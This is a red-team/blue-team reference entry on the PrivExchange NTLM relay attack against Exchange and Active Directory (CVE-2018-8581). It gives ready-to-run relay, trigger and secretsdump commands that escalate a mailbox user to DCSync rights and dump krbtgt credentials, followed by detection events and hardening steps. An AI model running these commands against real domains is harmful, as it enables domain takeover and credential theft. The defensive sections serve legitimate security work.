# [PE-REMOTE-002]: PrivExchange Attack (PushSubscription NTLM Relay)

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-REMOTE-002 |
| **MITRE ATT&CK v18.1** | [Exploitation of Remote Services (T1210)](https://attack.mitre.org/techniques/T1210/) |
| **Tactic** | Privilege Escalation / Credential Access |
| **Platforms** | Windows AD / Exchange |
| **Severity** | **Critical** |
| **CVE** | **CVE-2018-8581** (PushSubscription Abuse) |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** The "PrivExchange" attack leverages a feature in Exchange Web Services (EWS) called `PushSubscription`. An attacker with *any* valid mailbox credential can request the Exchange Server to send push notifications to a URL of their choice. By specifying an attacker-controlled SMB or HTTP listener as the destination, the Exchange server authenticates to the attacker using its Machine Account (`Exchange$`) via NTLM. This NTLM authentication can then be relayed to the Domain Controller (via LDAP) to perform a DCSync attack, granting Domain Admin privileges.
- **Attack Surface:** Exchange EWS (`/EWS/Exchange.asmx`).
- **Business Impact:** **Instant Domain Compromise**. From any user with a mailbox to Domain Admin.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Any Authenticated User with a Mailbox.
- **Tools:**
    - [privexchange.py](https://github.com/dirkjanm/PrivExchange)
    - [ntlmrelayx.py](https://github.com/fortra/impacket)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Start Relay (LDAP)**
Set up `ntlmrelayx` to relay incoming connections to the DC and execute a DCSync.
```bash
python3 ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user attacker_user
```

**Step 2: Trigger Notification**
Use `privexchange.py` to tell Exchange to connect to your relay.
```bash
python3 privexchange.py -ah attacker_ip -u bob -p password123 -d corp.local exchange01.corp.local
```

**Step 3: Verification**
If successful, `ntlmrelayx` will modify the ACLs of `attacker_user` to allow DCSync.
```bash
secretsdump.py corp/attacker_user:password@dc01 -just-dc-user krbtgt
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 AD Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Security** | 5136 | Directory Service Object Modified. Modifications to the Domain Object ACL by the Exchange Machine Account. |
| **Exchange** | `EWS` | `PushSubscription` requests pointing to non-standard ports or IPs. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Patch:** This specific flaw (CVE-2018-8581) was patched, but the *concept* of coercing auth remains. Apply all Exchange CUs.
*   **Remove Exchange Permissions:** Run the "Exchange Split Permissions" script to remove the excessive privileges (`WriteDacl`) that the Exchange group has on the Domain object.
*   **Enable LDAP Signing:** Enforce LDAP Signing and Channel Binding on Domain Controllers to prevent relaying to LDAP.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-PASS-001]
> **Next Logical Step:** [CA-UNSC-001] (DCSync)
